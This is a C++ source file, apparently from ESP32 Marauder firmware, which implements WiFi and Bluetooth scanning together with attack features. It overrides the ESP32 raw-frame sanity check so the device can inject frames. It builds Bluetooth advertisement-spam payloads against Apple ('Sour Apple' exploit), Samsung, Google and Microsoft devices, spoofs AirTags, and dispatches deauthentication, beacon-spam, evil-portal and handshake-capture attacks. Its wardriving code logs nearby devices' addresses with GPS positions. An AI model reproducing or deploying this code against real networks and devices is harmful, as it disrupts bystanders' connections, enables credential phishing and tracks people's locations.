#include "WiFiScan.h"
#include "lang_var.h"

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid>* ssids;
LinkedList<AccessPoint>* access_points;
LinkedList<Station>* stations;
LinkedList<AirTag>* airtags;
LinkedList<Flipper>* flippers;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}

extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}

#ifdef HAS_BT
  //ESP32 Sour Apple by RapierXbox
  //Exploit by ECTO-1A
  NimBLEAdvertising *pAdvertising;

  //// https://github.com/Spooks4576
  NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
      case Microsoft: {
        
        const char* Name = generateRandomName();

        uint8_t name_len = strlen(Name);

        AdvData_Raw = new uint8_t[7 + name_len];

        AdvData_Raw[i++] = 7 + name_len - 1;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x06;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x80;
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
        break;
      }
      case Apple: {
        AdvData_Raw = new uint8_t[17];

        AdvData_Raw[i++] = 17 - 1;    // Packet Length
        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        AdvData_Raw[i++] = 0x00;        // ...
        AdvData_Raw[i++] = 0x0F;  // Type
        AdvData_Raw[i++] = 0x05;                        // Length
        AdvData_Raw[i++] = 0xC1;                        // Action Flags
        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
        i += 3;   
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] =  0x10;  // Type ???
        esp_fill_random(&AdvData_Raw[i], 3);

        AdvData.addData(std::string((char *)AdvData_Raw, 17));
        break;
      }
      case Samsung: {

        AdvData_Raw = new uint8_t[15];

        uint8_t model = watch_models[rand() % 25].value;
        
        AdvData_Raw[i++] = 14; // Size
        AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
        AdvData_Raw[i++] = 0x00; // ...
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x02;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0x01;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x43;
        AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

        AdvData.addData(std::string((char *)AdvData_Raw, 15));

        break;
      }
      case Google: {
        AdvData_Raw = new uint8_t[14];
        AdvData_Raw[i++] = 3;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;

        AdvData_Raw[i++] = 6;
        AdvData_Raw[i++] = 0x16;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;
        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
        AdvData_Raw[i++] = 0xB7;
        AdvData_Raw[i++] = 0x27;

        AdvData_Raw[i++] = 2;
        AdvData_Raw[i++] = 0x0A;
        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        AdvData.addData(std::string((char *)AdvData_Raw, 14));
        break;
      }
      case FlipperZero: {
        // Generate a random 5-letter name for the advertisement
        char Name[6];  // 5 characters + null terminator
        generateRandomName(Name, sizeof(Name));

        uint8_t name_len = strlen(Name);

        // Allocate space for the full Advertisement Data section based on the hex dump
        AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump

        // Advertisement Data from the hex dump
        AdvData_Raw[i++] = 0x02;  // Flags length
        AdvData_Raw[i++] = 0x01;  // Flags type
        AdvData_Raw[i++] = 0x06;  // Flags value

        AdvData_Raw[i++] = 0x06;  // Name length (5 + type)
        AdvData_Raw[i++] = 0x09;  // Complete Local Name type

        // Add the randomized 5-letter name
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData_Raw[i++] = 0x03;  // Incomplete List of 16-bit Service UUIDs length
        AdvData_Raw[i++] = 0x02;  // Incomplete List of 16-bit Service UUIDs type
        AdvData_Raw[i++] = 0x80 + (rand() % 3) + 1;   // Service UUID (part of hex dump)
        AdvData_Raw[i++] = 0x30;

        AdvData_Raw[i++] = 0x02;  // TX Power level length
        AdvData_Raw[i++] = 0x0A;  // TX Power level type
        AdvData_Raw[i++] = 0x00;  // TX Power level value

        // Manufacturer specific data based on your hex dump
        AdvData_Raw[i++] = 0x05;  // Length of Manufacturer Specific Data section
        AdvData_Raw[i++] = 0xFF;  // Manufacturer Specific Data type
        AdvData_Raw[i++] = 0xBA;  // LSB of Manufacturer ID (Flipper Zero: 0x0FBA)
        AdvData_Raw[i++] = 0x0F;  // MSB of Manufacturer ID

        AdvData_Raw[i++] = 0x4C;  // Example data (remaining as in your dump)
        AdvData_Raw[i++] = 0x75;
        AdvData_Raw[i++] = 0x67;
        AdvData_Raw[i++] = 0x26;
        AdvData_Raw[i++] = 0xE1;
        AdvData_Raw[i++] = 0x80;

        // Add the constructed Advertisement Data to the BLE advertisement
        AdvData.addData(std::string((char *)AdvData_Raw, i));

        break;
      }

      case Airtag: {
        for (int i = 0; i < airtags->size(); i++) {
          if (airtags->get(i).selected) {
            AdvData.addData(std::string((char*)airtags->get(i).payload.data(), airtags->get(i).payloadSize));

            break;
          }
        }

        break;
      }
      default: {
        Serial.println("Please Provide a Company Type");
        break;
      }
    }

    delete[] AdvData_Raw;

    return AdvData;
  }
  //// https://github.com/Spooks4576


  class bluetoothScanAllCallback: public NimBLEAdvertisedDeviceCallbacks {
  
      void onResult(NimBLEAdvertisedDevice *advertisedDevice) {

        extern WiFiScan wifi_scan_obj;
  
        //#ifdef HAS_SCREEN
        //  int buf = display_obj.display_buffer->size();
        //#else
        int buf = 0;
        //#endif
          
        String display_string = "";

        if (wifi_scan_obj.currentScanMode == BT_SCAN_AIRTAG) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x1E && payLoad[i+1] == 0xFF && payLoad[i+2] == 0x4C && payLoad[i+3] == 0x00) {
              match = true;
              break;
            }
            if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            mac.toUpperCase();

            for (int i = 0; i < airtags->size(); i++) {
              if (mac == airtags->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Len: ");
            Serial.print(len);
            Serial.print(" Payload: ");
            for (size_t i = 0; i < len; i++) {
              Serial.printf("%02X ", payLoad[i]);
            }
            Serial.println("\n");

            AirTag airtag;
            airtag.mac = mac;
            airtag.payload.assign(payLoad, payLoad + len);
            airtag.payloadSize = len;

            airtags->add(airtag);


            #ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" MAC: ");
              display_string.concat(mac);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif
          }
        }
        else if (wifi_scan_obj.currentScanMode == BT_SCAN_FLIPPER) {
          uint8_t* payLoad = advertisedDevice->getPayload();
          size_t len = advertisedDevice->getPayloadLength();

          bool match = false;
          String color = "";
          for (int i = 0; i <= len - 4; i++) {
            if (payLoad[i] == 0x81 && payLoad[i+1] == 0x30) {
              match = true;
              color = "Black";
              break;
            }
            if (payLoad[i] == 0x82 && payLoad[i+1] == 0x30) {
              match = true;
              color = "White";
              break;
            }
            if (payLoad[i] == 0x83 && payLoad[i+1] == 0x30) {
              color = "Transparent";
              match = true;
              break;
            }
          }

          if (match) {
            String mac = advertisedDevice->getAddress().toString().c_str();
            String name = advertisedDevice->getName().c_str();
            mac.toUpperCase();

            for (int i = 0; i < flippers->size(); i++) {
              if (mac == flippers->get(i).mac)
                return;
            }

            int rssi = advertisedDevice->getRSSI();
            Serial.print("RSSI: ");
            Serial.print(rssi);
            Serial.print(" MAC: ");
            Serial.println(mac);
            Serial.print("Name: ");
            Serial.println(name);

            Flipper flipper;
            flipper.mac = mac;
            flipper.name = name;

            flippers->add(flipper);


            /*#ifdef HAS_SCREEN
              //display_string.concat("RSSI: ");
              display_string.concat((String)rssi);
              display_string.concat(" Flipper: ");
              display_string.concat(name);
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
              display_obj.display_buffer->add(display_string);
            #endif*/

            #ifdef HAS_SCREEN
              display_obj.display_buffer->add(String("Flipper: ") + name + ",                 ");
              display_obj.display_buffer->add("       MAC: " + String(mac) + ",             ");
              display_obj.display_buffer->add("      RSSI: " + String(rssi) + ",               ");
              display_obj.display_buffer->add("     Color: " + String(color) + "                ");
            #endif
          }
        }
        else if (wifi_scan_obj.currentScanMode == BT_SCAN_ALL) {
          if (buf >= 0)
          {
            display_string.concat(text_table4[0]);
            display_string.concat(advertisedDevice->getRSSI());
            Serial.print(" RSSI: ");
            Serial.print(advertisedDevice->getRSSI());
    
            display_string.concat(" ");
            Serial.print(" ");
            
            Serial.print("Device: ");
            if(advertisedDevice->getName().length() != 0)
            {
              display_string.concat(advertisedDevice->getName().c_str());
              Serial.print(advertisedDevice->getName().c_str());
              
            }
            else
            {
              display_string.concat(advertisedDevice->getAddress().toString().c_str());
              Serial.print(advertisedDevice->getAddress().toString().c_str());
            }
    
            #ifdef HAS_SCREEN
              uint8_t temp_len = display_string.length();
              for (uint8_t i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
      
              Serial.println();
      
              while (display_obj.printing)
                delay(1);
              display_obj.loading = true;
              display_obj.display_buffer->add(display_string);
              display_obj.loading = false;
            #endif
          }
        }
        else if ((wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE)  || (wifi_scan_obj.currentScanMode == BT_SCAN_WAR_DRIVE_CONT)) {
          #ifdef HAS_GPS
            if (gps_obj.getGpsModuleStatus()) {
              bool do_save = false;
              if (buf >= 0)
              {                
                Serial.print("Device: ");
                if(advertisedDevice->getName().length() != 0)
                {
                  display_string.concat(advertisedDevice->getName().c_str());
                  Serial.print(advertisedDevice->getName().c_str());
                  
                }
                else
                {
                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
                  Serial.print(advertisedDevice->getAddress().toString().c_str());
                }

                if (gps_obj.getFixStatus()) {
                  do_save = true;
                  display_string.concat(" | Lt: " + gps_obj.getLat());
                  display_string.concat(" | Ln: " + gps_obj.getLon());
                }
                else {
                  display_string.concat(" | GPS: No Fix");
                }
        
                #ifdef HAS_SCREEN
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
          
                  Serial.println();
          
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                #endif

                String wardrive_line = (String)advertisedDevice->getAddress().toString().c_str() + ",,[BLE]," + gps_obj.getDatetime() + ",0," + (String)advertisedDevice->getRSSI() + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",BLE\n";
                Serial.print(wardrive_line);

                if (do_save)
                  buffer_obj.append(wardrive_line);
              }
            }
          #endif
        }
      }
  };
  
  class bluetoothScanSkimmersCallback: public BLEAdvertisedDeviceCallbacks {
      void onResult(BLEAdvertisedDevice *advertisedDevice) {
        String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
  
        #ifdef HAS_SCREEN
          int buf = display_obj.display_buffer->size();
        #else
          int buf = 0;
        #endif
          
        if (buf >= 0)
        {
          Serial.print("Device: ");
          String display_string = "";
          if(advertisedDevice->getName().length() != 0)
          {
            Serial.print(advertisedDevice->getName().c_str());
            for(uint8_t i = 0; i < bad_list_length; i++)
            {
              #ifdef HAS_SCREEN
                if(strcmp(advertisedDevice->getName().c_str(), bad_list[i].c_str()) == 0)
                {
                  display_string.concat(text_table4[1]);
                  display_string.concat(" ");
                  display_string.concat(advertisedDevice->getName().c_str());
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                }
              #endif
            }
          }
          else
          {
            Serial.print(advertisedDevice->getAddress().toString().c_str());
          }
          Serial.print(" RSSI: ");
          Serial.println(advertisedDevice->getRSSI());
        }
      }
  };
#endif


WiFiScan::WiFiScan()
{
}

/*String WiFiScan::macToString(const Station& station) {
  char macStr[18]; // 6 pairs of hex digits + 5 colons + null terminator
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           station.mac[0], station.mac[1], station.mac[2],
           station.mac[3], station.mac[4], station.mac[5]);
  return String(macStr);
}*/

void WiFiScan::RunSetup() {
  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
    this->wsl_bypass_enabled = true;
  else
    this->wsl_bypass_enabled = false;
    
  ssids = new LinkedList<ssid>();
  access_points = new LinkedList<AccessPoint>();
  stations = new LinkedList<Station>();
  airtags = new LinkedList<AirTag>();
  flippers = new LinkedList<Flipper>();

  #ifdef HAS_BT
    watch_models = new WatchModel[26] {
      {0x1A, "Fallback Watch"},
      {0x01, "White Watch4 Classic 44m"},
      {0x02, "Black Watch4 Classic 40m"},
      {0x03, "White Watch4 Classic 40m"},
      {0x04, "Black Watch4 44mm"},
      {0x05, "Silver Watch4 44mm"},
      {0x06, "Green Watch4 44mm"},
      {0x07, "Black Watch4 40mm"},
      {0x08, "White Watch4 40mm"},
      {0x09, "Gold Watch4 40mm"},
      {0x0A, "French Watch4"},
      {0x0B, "French Watch4 Classic"},
      {0x0C, "Fox Watch5 44mm"},
      {0x11, "Black Watch5 44mm"},
      {0x12, "Sapphire Watch5 44mm"},
      {0x13, "Purpleish Watch5 40mm"},
      {0x14, "Gold Watch5 40mm"},
      {0x15, "Black Watch5 Pro 45mm"},
      {0x16, "Gray Watch5 Pro 45mm"},
      {0x17, "White Watch5 44mm"},
      {0x18, "White & Black Watch5"},
      {0x1B, "Black Watch6 Pink 40mm"},
      {0x1C, "Gold Watch6 Gold 40mm"},
      {0x1D, "Silver Watch6 Cyan 44mm"},
      {0x1E, "Black Watch6 Classic 43m"},
      {0x20, "Green Watch6 Classic 43m"},
    };
    
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    this->ble_initialized = true;
    
    this->shutdownBLE();
  #endif

  this->initWiFi(1);
}

int WiFiScan::clearStations() {
  int num_cleared = stations->size();
  stations->clear();
  Serial.println("stations: " + (String)stations->size());

  // Now clear stations list from APs
  for (int i = 0; i < access_points->size(); i++)
    access_points->get(i).stations->clear();
    
  return num_cleared;
}

bool WiFiScan::checkMem() {
  if (esp_get_free_heap_size() <= MEM_LOWER_LIM)
    return false;
  else
    return true;
}

int WiFiScan::clearAPs() {
  int num_cleared = access_points->size();
  while (access_points->size() > 0)
    access_points->remove(0);
  Serial.println("access_points: " + (String)access_points->size());
  return num_cleared;
}

int WiFiScan::clearAirtags() {
  int num_cleared = airtags->size();
  while (airtags->size() > 0)
    airtags->remove(0);
  Serial.println("airtags: " + (String)airtags->size());
  return num_cleared;
}

int WiFiScan::clearFlippers() {
  int num_cleared = flippers->size();
  while (flippers->size() > 0)
    flippers->remove(0);
  Serial.println("Flippers: " + (String)flippers->size());
  return num_cleared;
}

int WiFiScan::clearSSIDs() {
  int num_cleared = ssids->size();
  ssids->clear();
  Serial.println("ssids: " + (String)ssids->size());
  return num_cleared;
}

bool WiFiScan::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

int WiFiScan::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

/*void WiFiScan::joinWiFi(String ssid, String password)
{
  static const char * btns[] ={text16, ""};
  int count = 0;
  
  if ((WiFi.status() == WL_CONNECTED) && (ssid == connected_network) && (ssid != "")) {
    #ifdef HAS_SCREEN
      lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
      lv_msgbox_set_text(mbox1, text_table4[2]);
      lv_msgbox_add_btns(mbox1, btns);
      lv_obj_set_width(mbox1, 200);
      lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
    #endif
    this->wifi_initialized = true;
    return;
  }
  else if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Already connected. Disconnecting...");
    WiFi.disconnect();
  }

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
    
  WiFi.begin(ssid.c_str(), password.c_str());

  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    count++;
    if (count == 10)
    {
      Serial.println("\nCould not connect to WiFi network");
      #ifdef HAS_SCREEN
        lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
        lv_msgbox_set_text(mbox1, text_table4[3]);
        lv_msgbox_add_btns(mbox1, btns);
        lv_obj_set_width(mbox1, 200);
        //lv_obj_set_event_cb(mbox1, event_handler);
        lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
      #endif
      WiFi.mode(WIFI_OFF);
      return;
    }
  }
  
  #ifdef HAS_SCREEN
    lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
    lv_msgbox_set_text(mbox1, text_table4[4]);
    lv_msgbox_add_btns(mbox1, btns);
    lv_obj_set_width(mbox1, 200);
    lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); //Align to the corner
  #endif
  connected_network = ssid;
  
  Serial.println("\nConnected to the WiFi network");
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
  this->wifi_initialized = true;
}*/

// Apply WiFi settings
void WiFiScan::initWiFi(uint8_t scan_mode) {
  // Set the channel
  if (scan_mode != WIFI_SCAN_OFF) {
    //Serial.println(F("Initializing WiFi settings..."));
    this->changeChannel();
  
    this->force_pmkid = settings_obj.loadSetting<bool>(text_table4[5]);
    this->force_probe = settings_obj.loadSetting<bool>(text_table4[6]);
    this->save_pcap = settings_obj.loadSetting<bool>(text_table4[7]);
    //Serial.println(F("Initialization complete"));
  }
}

bool WiFiScan::scanning() {
  if (this->currentScanMode == WIFI_SCAN_OFF)
    return false;
  else
    return true;
}

// Function to prepare to run a specific scan
void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
{  
  this->initWiFi(scan_mode);
  if (scan_mode == WIFI_SCAN_OFF)
    StopScan(scan_mode);
  else if (scan_mode == WIFI_SCAN_PROBE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EVIL_PORTAL)
    RunEvilPortal(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_SIG_STREN)
    RunRawScan(scan_mode, color);    
  else if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
    RunRawScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION)
    RunStationScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_PWN)
    RunPwnScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DEAUTH)
    RunDeauthScan(scan_mode, color);
  else if (scan_mode == WIFI_PACKET_MONITOR) {
    #ifdef HAS_SCREEN
      RunPacketMonitor(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_ATTACK_BEACON_LIST)
    this->startWiFiAttacks(scan_mode, color, text_table1[50]);
  else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
    this->startWiFiAttacks(scan_mode, color, text_table1[51]);
  else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
    this->startWiFiAttacks(scan_mode, color, text_table1[52]);
  else if (scan_mode == WIFI_ATTACK_AUTH)
    this->startWiFiAttacks(scan_mode, color, text_table1[53]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
    this->startWiFiAttacks(scan_mode, color, text_table4[47]);
  else if (scan_mode == WIFI_ATTACK_AP_SPAM)
    this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
  else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER)){
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == BT_ATTACK_SOUR_APPLE) {
    #ifdef HAS_BT
      RunSourApple(scan_mode, color);
    #endif
  }
  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
           (scan_mode == BT_ATTACK_SPAM_ALL) ||
           (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
           (scan_mode == BT_ATTACK_GOOGLE_SPAM) ||
           (scan_mode == BT_ATTACK_FLIPPER_SPAM) ||
           (scan_mode == BT_SPOOF_AIRTAG)) {
    #ifdef HAS_BT
      RunSwiftpairSpam(scan_mode, color);
    #endif
  }
  else if ((scan_mode == BT_SCAN_WAR_DRIVE) ||
           (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == BT_SCAN_SKIMMERS) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == LV_ADD_SSID) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_SCAN_GPS_NMEA){
    #ifdef HAS_GPS
      gps_obj.enable_queue();
    #endif
  }

  WiFiScan::currentScanMode = scan_mode;
}

void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_string) {
  // Common wifi attack configurations
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
      display_obj.tft.drawCentreString((String)title_string,TFT_WIDTH / 2,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif

  //wifi_ap_config_t ap_config;
  //ap_config.ssid_hidden = 1;

  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  ap_config.ap.ssid_len = 0;
        
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  
  //WiFi.mode(WIFI_AP_STA);
  
  //esp_wifi_init(&cfg);
  //esp_wifi_set_storage(WIFI_STORAGE_RAM);
  //esp_wifi_set_mode(WIFI_AP_STA);
  //esp_wifi_start();
  //esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);
  this->wifi_initialized = true;
  #ifdef MARAUDER_FLIPPER
    flipper_led.attackLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.attackLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.attackLED();
  #else
    led_obj.setMode(MODE_ATTACK);
  #endif
  initTime = millis();
}

bool WiFiScan::shutdownWiFi() {
  if (this->wifi_initialized) {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);

    dst_mac = "ff:ff:ff:ff:ff:ff";
  
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_restore();
    esp_wifi_deinit();

    #ifdef MARAUDER_FLIPPER
      flipper_led.offLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.offLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.offLED();
    #else
      led_obj.setMode(MODE_OFF);
    #endif
  
    this->wifi_initialized = false;
    return true;
  }
  else {
    return false;
  }
}

bool WiFiScan::shutdownBLE() {
  #ifdef HAS_BT
    if (this->ble_initialized) {
      Serial.println("Shutting down BLE");
      pAdvertising->stop();
      pBLEScan->stop();
      
      pBLEScan->clearResults();
      NimBLEDevice::deinit();
    
      this->ble_initialized = false;
    }
    else {
      return false;
    }

    #ifdef MARAUDER_FLIPPER
      flipper_led.offLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.offLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.offLED();
    #else
      led_obj.setMode(MODE_OFF);
    #endif

  #endif

  return true;
}

// Function to stop all wifi scans
void WiFiScan::StopScan(uint8_t scan_mode)
{
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_EVIL_PORTAL) ||
  (currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
  (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
  (currentScanMode == WIFI_ATTACK_AUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
  (currentScanMode == WIFI_ATTACK_MIMIC) ||
  (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
  (currentScanMode == WIFI_PACKET_MONITOR) ||
  (currentScanMode == LV_JOIN_WIFI))
  {
    this->shutdownWiFi();
  }

  
  else if ((currentScanMode == BT_SCAN_ALL) ||
